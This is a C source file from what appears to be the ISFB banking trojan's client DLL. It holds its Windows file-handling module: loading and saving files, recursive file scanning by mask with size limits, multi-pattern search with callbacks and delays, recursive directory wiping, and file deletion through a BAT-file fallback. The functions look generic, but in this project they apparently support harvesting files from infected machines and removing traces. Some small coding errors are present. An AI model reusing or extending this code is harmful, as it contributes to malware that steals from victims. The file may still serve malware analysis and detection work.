//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: files.c
// $Revision: 452 $
// $Date: 2015-01-20 20:22:38 +0300 (Вт, 20 янв 2015) $
// description:
//	CRM client dll. Files manipulation functions. 


#include "..\common\common.h"
#include <shlobj.h>


#define		FILE_SIZE_MAX		(5*1024*1024)		// bytes
#define		DRIVE_NAME_MAX		16				// chars

#define FILE_MAP_WAIT_TIMEOUT	10*1000		// milliseconds
#define FILE_MAP_LIVE_TIMEOUT	10*60*1000	// milliseconds

#define	FILE_PACK_TIMEOUT		60000		// milliseconds

extern	HANDLE					g_AppShutdownEvent;


PFILE_DESCW FileDescAlloc(ULONG Length)
{
	PFILE_DESCW fDesc = AppAlloc(sizeof(FILE_DESCW) + Length);
	if (fDesc)
	{
		memset(fDesc, 0, sizeof(FILE_DESCW) + Length);
		InitializeListHead(&fDesc->Entry);
	}
	return(fDesc);
}


//
//	Checks the specified path string if it contains an environment variable and if so resolves it's value.
//	Returns new resolved path string or NULL.
//
LPWSTR	FilesExpandEnvironmentVariablesW(
	LPWSTR	pPath	// target path string to resolve
	)
{
	LPWSTR	NewPath = NULL;
	ULONG	Len;

	if (pPath && (Len = ExpandEnvironmentStringsW(pPath, NULL, 0)))
	{
		if (NewPath = AppAlloc(Len * sizeof(WCHAR)))
		{
			if (!ExpandEnvironmentStringsW(pPath, NewPath, Len))
			{
				AppFree(NewPath);
				NewPath = NULL;
			}	// if (!ExpandEnvironmentStringsW(Path, NewPath, Len))
		}	// if (NewPath = AppAlloc(Len))
	}	// if ((Len = ExpandEnvironmentStringsW(Path, NULL, 0)) && Len > OldLen)

	return(NewPath);
}


//
//	Checks the specified path string if it contains an environment variable and if so resolves it's value.
//	Returns new resolved path string or NULL.
//
LPWSTR	FilesExpandEnvironmentVariablesAtoW(
	LPSTR	pPath	// target path string to resolve
	)
{
	LPWSTR	pNewPath = NULL, pPathW;
	ULONG	Length;

	if (pPath)
	{
		Length = lstrlenA(pPath);

		if (pPathW = AppAlloc((Length + 1) * sizeof(WCHAR)))
		{
			mbstowcs(pPathW, pPath, Length + 1);
			if (pNewPath = FilesExpandEnvironmentVariablesW(pPathW))
				AppFree(pPathW);
			else
				pNewPath = pPathW;
		}
	}	// if (Path)

	return(pNewPath);
}


//
//	Checks the specified path string if it contains an environment variable and if so resolves it's value.
//	Returns new resolved path string or NULL.
//
LPSTR	FilesExpandEnvironmentVariablesA(
	LPSTR	pPath	// target path string to resolve
	)
{
	LPSTR	NewPath = NULL;
	LPWSTR	pPathW;
	ULONG	Len;

	if (pPathW = FilesExpandEnvironmentVariablesAtoW(pPath))
	{
		PathGetShortPath(pPathW);
		Len = lstrlenW(pPathW);
		if (NewPath = AppAlloc(Len + 1))
			wcstombs(NewPath, pPathW, Len + 1);

		AppFree(pPathW);
	}

	return(NewPath);
}


//
//	Allocates a buffer and loads the specified file into it.
//
WINERROR FilesLoadFileA(
	LPSTR	FileName,	// full path to the file to load
	PCHAR*	pBuffer,	// receives a pointer to the buffer containing the loaded file
	PULONG	pSize		// receives the size of the loaded file in bytes
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	HANDLE	hFile;
	ULONG	Size, bRead;
	LPWSTR	pPath;
	PCHAR	Buffer = NULL;

	do	// not a loop
	{
		if (!(pPath = FilesExpandEnvironmentVariablesAtoW(FileName)))
			break;

		hFile = CreateFileW(pPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
			break;
	
		if ((Size = GetFileSize(hFile, NULL)) == 0)
		{
			Status = ERROR_NO_DATA;
			break;
		}

		// Allocating a buffer with one extra char at the end for a NULL-char to be able to work with a text file.
		if (!(Buffer = AppAlloc(Size + sizeof(_TCHAR))))
			break;
			
		if (!ReadFile(hFile, Buffer, Size, &bRead, NULL))
			break;

		if (Size != bRead)
		{
			Status = ERROR_READ_FAULT;
			break;
		}

		Buffer[Size] = 0;

		*pBuffer = Buffer;
		*pSize = Size;
		Status = NO_ERROR;
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if (Buffer && (Status != NO_ERROR))
		AppFree(Buffer);

	if (pPath)
		AppFree(pPath);

	return(Status);
}

//
//	Writes the specified data buffer to a file.
//
WINERROR FilesSaveFileA(
	LPSTR	FileName,	// full path to the file to write
	PCHAR	Buffer,		// buffer containing a data to write
	ULONG	Size,		// size of the buffer in bytes
	ULONG	Flags		// any of FILE_FLAG_XXX constants
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hFile;
	LPWSTR	pPath;
	ULONG	bWritten, Disposition = (Flags & (FILE_FLAG_OVERWRITE | FILE_FLAG_APPEND)) ? OPEN_ALWAYS : CREATE_NEW;

	if (pPath = FilesExpandEnvironmentVariablesAtoW(FileName))
	{
		hFile = CreateFileW(pPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, Disposition, FILE_ATTRIBUTE_NORMAL, 0);

		while ((hFile == INVALID_HANDLE_VALUE) && ((Status = GetLastError()) == ERROR_SHARING_VIOLATION) && (Flags & FILE_FLAG_WAIT_SHARE))
		{
			Sleep(10);
			hFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, Disposition, FILE_ATTRIBUTE_NORMAL, 0);
		}

		if (hFile != INVALID_HANDLE_VALUE)
		{
			if (Flags & FILE_FLAG_APPEND)
				SetFilePointer(hFile, 0, NULL, FILE_END);

			if (WriteFile(hFile, Buffer, Size, &bWritten, NULL))
			{
				SetEndOfFile(hFile);
				Status = NO_ERROR;
			}
			else
				Status = GetLastError();

			CloseHandle(hFile);
		}	// if (hFile != INVALID_HANDLE_VALUE)
		else
		{
			ASSERT(Status != NO_ERROR);
		}

		AppFree(pPath);
	}	// if (pPath = FilesExpandEnvironmentVariablesAtoW(FileName))
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;
 
	return(Status);
}


// combines dir and file name to the full path
BOOL FilesPathCombineW(LPWSTR dest, const LPWSTR dir, const LPWSTR file)
{
	LPWSTR p = (LPWSTR)file;
	if(p != NULL)while(*p == '\\' || *p == '/')p++;
	return PathCombineW(dest, dir, p) == NULL ? FALSE : TRUE;
}

BOOL FilesPathCombineA(LPSTR dest, const LPSTR dir, const LPSTR file)
{
	LPSTR p = (LPSTR)file;
	if(p != NULL)while(*p == '\\' || *p == '/')p++;
	return PathCombineA(dest, dir, p) == NULL ? FALSE : TRUE;
}

// checks the file name
BOOL FilesIsDotsNameW(LPWSTR name)
{
	return (name && *name == L'.' && (name[1] == 0 || (name[1] == L'.' && name[2] == 0))) ? TRUE : FALSE;
}

BOOL FilesIsDotsNameA(LPWSTR name)
{
	return (name && *name == '.' && (name[1] == 0 || (name[1] == '.' && name[2] == 0))) ? TRUE : FALSE;
}

//
// gets string from file (/n is a delimiter)
//
DWORD FileReadStringA(HANDLE hFile, LPSTR Buffer, DWORD Length )
{
	CHAR ch;
	BOOL bWasChar = FALSE;
	DWORD BytesRead = 0;
	CHAR *pointer = Buffer;
	if ( Buffer == NULL || Length == 0 ){
		return 0;
	}

	while ( --Length )
	{
		if ( !ReadFile(hFile,&ch,1,&BytesRead, NULL ) || BytesRead != 1 )
		{
			break;
		}
		if ( ch == '\n'){
			if ( bWasChar ){
				break;
			}
		}else if ( ch == '\r'){
			if ( bWasChar ){
				break;
			}
		}else{
			bWasChar = TRUE;
			*pointer++ = ch;
		}
	}
	*pointer = '\0';
	return (DWORD)(pointer-Buffer);
}

DWORD FileReadStringW(HANDLE hFile, LPWSTR Buffer, DWORD Length )
{
	CHAR ch;
	BOOL bWasChar = FALSE;
	DWORD BytesRead = 0;
	WCHAR *pointer = Buffer;
	if ( Buffer == NULL || Length == 0 ){
		return 0;
	}

	while ( --Length )
	{
		if ( !ReadFile(hFile,&ch,1,&BytesRead, NULL ) || BytesRead != 1 )
		{
			break;
		}
		if ( ch == '\n'){
			if ( bWasChar ){
				break;
			}
		}else if ( ch == '\r'){
			if ( bWasChar ){
				break;
			}
		}else{
			bWasChar = TRUE;
			*pointer++ = ch;
		}
	}
	*pointer = L'\0';
	return (DWORD)(pointer-Buffer);
}

DWORD FileReadStringExW(HANDLE hFile, LPWSTR Buffer, DWORD Length, LPWSTR Delimiters )
{
	CHAR ch;
	BOOL bWasChar = FALSE;
	DWORD BytesRead = 0;
	int nDelimiters = lstrlenW(Delimiters);
	int i;
	WCHAR *pointer = Buffer;
	if ( Buffer == NULL || Length == 0 ){
		return 0;
	}

	while ( --Length )
	{
		if ( !ReadFile(hFile,&ch,1,&BytesRead, NULL ) || BytesRead != 1 )
		{
			break;
		}
		for ( i = 0; i < nDelimiters; i++ ){
			if ( ch == Delimiters[i]){
				if ( bWasChar ){
					Length = 1; //go out
					break;
				}
			} 
		}
		bWasChar = TRUE;
		*pointer++ = ch;
	}
	*pointer = L'\0';
	return (DWORD)(pointer-Buffer);
}


//
//	Searches for files according to the specified Mask starting from the specified Path. 
//	For every file found allocates FILE_DESCW structure and links all theese structures into the FileListHead.
//	Returns number of files found.
//	Note: In the ANSI version of FindFirstFile the name is limited to MAX_PATH characters. So we have to use UNICODE version 
//		to completely scan all files.
//
ULONG	FilesScanW(
	PWCHAR				Path,			// directory to search in, should be ended with "\"
	PWCHAR				Mask,			// search mask
	PLIST_ENTRY			FilesList,		// the list where all FILE_DESCW structures will be linked
	PCRITICAL_SECTION	FilesListLock,	// file list locking object (OPTIONAL)
	ULONG				SearchPathLen,	// the length of the initial search path in chars, used to keep directory structure 
										//  relative to the search path
	ULONG				SearchFlags		// various flags
	)
{
	ULONG	Found = 0, PathLen, MaskLen, ScanLen = MAX_PATH;
	LPWIN32_FIND_DATAW	FindData;
	PWCHAR	ScanPath, ResolvedPath = NULL;

	if (FindData = AppAlloc(sizeof(WIN32_FIND_DATAW)))
	{
		if (ResolvedPath = FilesExpandEnvironmentVariablesW(Path))
			Path = ResolvedPath;

		PathLen = wcslen(Path);
		MaskLen = wcslen(Mask);

		if (SearchPathLen == 0)
			SearchPathLen = PathLen;

		while ((PathLen + MaskLen + 2) > ScanLen)		// 1 for "\\" and 1 for "\0"
			ScanLen += MAX_PATH;

		if (ScanPath = AppAlloc(ScanLen * sizeof(WCHAR)))
		{
			HANDLE hFind;
			PFILE_DESCW	fDesc;	

			memset(FindData, 0, sizeof(WIN32_FIND_DATA));
			PathCombineW(ScanPath, Path, Mask);

			// Searching for files within the current directory first
			if ((hFind = FindFirstFileW(ScanPath, FindData)) != INVALID_HANDLE_VALUE)
			{
				do
				{
					if ((FindData->nFileSizeHigh) || (FindData->nFileSizeLow > FILE_SIZE_MAX))
						continue;

					if (FindData->cFileName[0] == '.')
						continue;

					if (fDesc = FileDescAlloc(sizeof(FILE_DESCW) + (PathLen + wcslen(Mask) + wcslen(FindData->cFileName) + 2) * sizeof(WCHAR)))
					{
						LPWSTR	pDir, pPath;

						wcscpy((PWCHAR)&fDesc->Path, Path);
						if (pDir = StrRChrW(Mask, NULL, L'\\'))
						{
							PathCombineW((PWCHAR)&fDesc->Path, Path, Mask);
							*PathFindFileNameW((PWCHAR)&fDesc->Path) = 0;
							pPath = (PWCHAR)&fDesc->Path;
						}
						else
							pPath = Path;

						PathCombineW((PWCHAR)&fDesc->Path, pPath, FindData->cFileName);
		
						fDesc->SearchPathLen = SearchPathLen;
						fDesc->Flags = SearchFlags;

						if (FilesListLock)	EnterCriticalSection(FilesListLock);
						InsertTailList(FilesList, &fDesc->Entry);
						if (FilesListLock)	LeaveCriticalSection(FilesListLock);
					
						Found += 1;
					}
				} while(FindNextFileW(hFind, FindData) && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT);

				FindClose(hFind);
			}	// if ((hFind = FindFirstFileW(ScanPath, FindData)) != INVALID_HANDLE_VALUE)

			// Files are searched, looking for directories to scan them recursively
			PathCombineW(ScanPath, Path, L"*");
	
			if ((hFind = FindFirstFileW(ScanPath, FindData)) != INVALID_HANDLE_VALUE)
			{
				do
				{
					if (FindData->cFileName[0] != '.' && (FindData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
					{
						MaskLen = wcslen(FindData->cFileName);
						if ((PathLen + MaskLen + 2) > ScanLen)		// 1 for "\\" and 1 for "\0"
						{
							AppFree(ScanPath);
							do {
								ScanLen += MAX_PATH;
							} while ((PathLen + MaskLen + 2) > ScanLen);

							if (!(ScanPath = AppAlloc(ScanLen * sizeof(WCHAR))))
								break;	// not enough memory
						}	// if ((PathLen + MaskLen + 2) > ScanLen)

						PathCombineW(ScanPath, Path, FindData->cFileName);

						Found += FilesScanW(ScanPath, Mask, FilesList, FilesListLock, SearchPathLen, SearchFlags);
					}	// if (FindData->cFileName[0] != '.' &&
				} while(FindNextFileW(hFind, FindData) && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT);

				FindClose(hFind);
			}	// if (hFind = FindFirstFileW(ScanPath, FindData))

			if (ScanPath)
				AppFree(ScanPath);
		}	// if (ScanPath = 

		if (ResolvedPath)
			AppFree(ResolvedPath);

		AppFree(FindData);
	}	// if (FindData)
	return(Found);
}


//
//	Searches for files according to the specified Mask starting from the specified Path. 
//	For every file found allocates FILE_DESCW structure and links all theese structures into the FileListHead.
//	Returns number of files found.
//
ULONG	FilesScanA(
	PCHAR				Path,			// directory to search in, should be ended with "\"
	PCHAR				Mask,			// search mask
	PLIST_ENTRY			FilesList,		// the list where all FILE_DESCW structures will be linked
	PCRITICAL_SECTION	FilesListLock,	// file list locking object (OPTIONAL)
	ULONG				SearchPathLen,	// the length of the initial search path in chars, used to keep directory structure 
										//  relative to the search path
	ULONG				SearchFlags		// various flags
	)
{
	ULONG	Len, Count = 0;
	PWSTR	PathW = NULL, MaskW = NULL;

	do	// not a loop
	{
		Len = lstrlenA(Path);
		if (!(PathW = AppAlloc((Len + 1) * sizeof(WCHAR))))
			break;
		mbstowcs(PathW, Path, Len + 1);

		Len = lstrlenA(Mask);
		if (!(MaskW = AppAlloc((Len + 1) * sizeof(WCHAR))))
			break;
		mbstowcs(MaskW, Mask, Len + 1);

		Count = FilesScanW(PathW, MaskW, FilesList, FilesListLock, SearchPathLen, SearchFlags);

	} while(FALSE);

	if (MaskW)
		AppFree(MaskW);
	if (PathW)
		AppFree(PathW);

	return(Count);
}


//
// Searches files by several patterns
//
VOID FilesScanExW(
	LPWSTR			path, 
	const LPWSTR*	fileMasks, 
	LONG			fileMasksCount, 
	DWORD			flags, 
	FINDFILEPROC	findFileProc, 
	PVOID			data, 
	HANDLE			stopEvent, 
	DWORD			subfolderDelay, 
	DWORD			foundedDelay
	)
{
	WCHAR curPath[MAX_PATH];
	WIN32_FIND_DATAW wfd;
	HANDLE hFind;
	BOOL fbExit = FALSE;
	int i;

	if(FilesPathCombineW(curPath, path, L"*") && (hFind = FindFirstFileW(curPath, &wfd)) != INVALID_HANDLE_VALUE)
	{
		do 
		{
			 // stop?
			if(stopEvent != NULL && WaitForSingleObject(stopEvent, 0) != WAIT_TIMEOUT){
				break;
			}

			if(!FilesIsDotsNameW(wfd.cFileName))
			{
				// check pattern
				if((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && flags & FFFLAG_SEARCH_FOLDERS) ||
					(!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && flags & FFFLAG_SEARCH_FILES))
				{
					for( i = 0; i < fileMasksCount; i++)
					{
						if( PathMatchSpecW(wfd.cFileName, fileMasks[i]) != FALSE)
						{
							if(!findFileProc(path, &wfd, data)){
								fbExit = TRUE; // exit while loop
								break;
							}
							if(foundedDelay != 0) {
								Sleep(foundedDelay);
							}
							break;
						}
					}
				}

				// recursive scan
				if(!fbExit && ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (flags & FFFLAG_RECURSIVE)))
				{
					if(FilesPathCombineW(curPath, path, wfd.cFileName))
					{
						if(subfolderDelay != 0) {
							Sleep(subfolderDelay);
						}
						FilesScanExW(curPath, fileMasks, fileMasksCount, flags, findFileProc, data, stopEvent, subfolderDelay, foundedDelay);
					}
				}
			} // if(!FilesIsDotsNameW(wfd.cFileName))
		}while( !fbExit && (FindNextFileW(hFind, &wfd) != FALSE));

		FindClose(hFind);
	} // if(FilesPathCombineW(...
}


//
//	Copmpletely clears a specified directory removing all files (and subdirectories if ClearSubfolders flag set).
//
WINERROR FilesClearDirectoryW(
	LPWSTR	pPath,					// A full path to deirecroty to clear
	BOOL	bClearSubfolders,		// Clear subfolders recursively
	BOOL	bIgnoreErrors			// Ignore file delete errors (aka ERROR_SHARING_VIOLATION and so on)
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PWIN32_FIND_DATAW	FindFileData = NULL;
	LPWSTR	pSearchPath = NULL, pFilePath = NULL;
	HANDLE	hFind;
	ULONG	DirPathLen, FilePathLen = MAX_PATH;					// chars

	do	// not a loop, used just to break out on error
	{
		DirPathLen	= (ULONG)lstrlenW(pPath);	// chars

		if (!(pFilePath = AppAlloc(FilePathLen * sizeof(WCHAR))))
		{
			ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		if (!(pSearchPath = AppAlloc((DirPathLen + cstrlenW(wczFindAll) + 2) * sizeof(WCHAR))))
		{
			ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		if (!(FindFileData = AppAlloc(sizeof(WIN32_FIND_DATAW))))
		{
			ASSERT(Status == ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		PathCombineW(pSearchPath, pPath, wczFindAll);

		hFind = FindFirstFileW(pSearchPath, FindFileData);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			Status = ERROR_PATH_NOT_FOUND;
			break;
		}

		Status = NO_ERROR;

		do
		{
			ULONG NameLen;
			ULONG PathLen;

			// Skip "." and ".." names. 
			if (FindFileData->cFileName[0] == '.')
				continue;

			NameLen = lstrlenW(FindFileData->cFileName);
			PathLen = DirPathLen + NameLen + 2; // a char for "\" and one for 0

			if (FilePathLen < PathLen)
			{
				AppFree(pFilePath);
				if (!(pFilePath = AppAlloc(PathLen * sizeof(WCHAR))))
				{
					Status = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
				FilePathLen = PathLen;
			}

			PathCombineW(pFilePath, pPath, (LPWSTR)FindFileData->cFileName);

			if (FindFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (bClearSubfolders)
				{
					if ((Status = FilesClearDirectoryW(pFilePath, TRUE, bIgnoreErrors)) == NO_ERROR)
					{
						if (!RemoveDirectoryW(pFilePath) && !bIgnoreErrors)
						{
							Status = GetLastError();
							break;
						}
					}
					else
						break;
				}	// if (ClearSubfolders)
			}	// if (FindFileData->dwFileAttributes & 
			else
			{
				if (!DeleteFileW(pFilePath) && !bIgnoreErrors)
				{
					Status = GetLastError();
					break;
				}
			}

		} while(FindNextFileW(hFind, FindFileData));

	} while (FALSE);

	if (FindFileData)
		AppFree(FindFileData);

	if (pSearchPath)
		AppFree(pSearchPath);

	if (pFilePath)
		AppFree(pFilePath);

	return(Status);
}


//
//	Copmpletely clears a specified directory removing all files (and subdirectories if ClearSubfolders flag set).
//
WINERROR FilesClearDirectoryA(
	LPSTR	pDirPath,				// A full path to deirecroty to clear
	BOOL	bClearSubfolders,		// Clear subfolders recursively
	BOOL	bIgnoreErrors			// Ignore file delete errors (aka ERROR_SHARING_VIOLATION and so on)
	)
{
	WINERROR Status;
	LPWSTR	pPath;

	if (pPath = FilesExpandEnvironmentVariablesAtoW(pDirPath))
	{
		Status = FilesClearDirectoryW(pPath, bClearSubfolders, bIgnoreErrors);
		AppFree(pPath);
	}
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;
	
	return(Status);
}


//
//	Deletes the specified file either immediately or using a special BAT file
//
WINERROR FilesDeleteFile(
	LPTSTR pFilePath
	)
{
	LPTSTR	pPath;
	WINERROR Status = NO_ERROR;

	if (pPath = FilesExpandEnvironmentVariables(pFilePath))
		pFilePath = pPath;

	if (!DeleteFile(pFilePath))
		Status = PsSupDeleteFileWithBat(pFilePath);

	if (pPath)
		AppFree(pPath);

	return(Status);
}


WINERROR FilesCreateDirectoryA(
	LPSTR pDirPath
	)
{
	LPWSTR	pPath;
	WINERROR Status = NO_ERROR;

	if (pPath = FilesExpandEnvironmentVariablesAtoW(pDirPath))
	{
		if (!CreateDirectoryW(pPath, NULL))
			Status = GetLastError();

		AppFree(pPath);
	}
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}


//
//	Generates and returns full path to a temporary file.
//
LPTSTR	FilesGetTempFile(
	ULONG Seed		// Seed value used to generate name.
					// We cannot just use GetTickCount() or GetSystemTime() for random name generation because it doesn't
					//  always work correctly and it is possible to receive to equal names by two subsequent calls.
	)
{
	LPTSTR		TempPath = NULL;
	ULONG		TempLen;
	BOOL		Ret = FALSE;

	do	// not a loop
	{		
		if (!(TempLen = GetTempPath(0, NULL)))
			break;

		if (!(TempPath = AppAlloc((TempLen + 14 + 1) * sizeof(_TCHAR))))
			break;

		if (!GetTempPath(TempLen, TempPath))
			break;

		if (!GetTempFileName(TempPath, NULL, (Seed + GetTickCount()), TempPath))
			break;

		Ret = TRUE;

	} while(FALSE);

	if (!Ret && TempPath)
	{
		AppFree(TempPath);
		TempPath = NULL;		
	}

	return(TempPath);
}


// combines dir and file name to the full path
BOOL FilePathCombineW(LPWSTR dest, const LPWSTR dir, const LPWSTR file)
{
	LPWSTR p = (LPWSTR)file;
	if(p != NULL)while(*p == '\\' || *p == '/')p++;
	return PathCombineW(dest, dir, p) == NULL ? FALSE : TRUE;
}


// returns TRUE if file exists on filesystem
BOOL FileExistsW( IN LPWSTR FIleName )
{
	return (GetFileAttributesW(FIleName)!=INVALID_FILE_ATTRIBUTES);
}

BOOL FileExistsA( IN LPSTR FIleName )
{
	return (GetFileAttributesA(FIleName)!=INVALID_FILE_ATTRIBUTES);
}
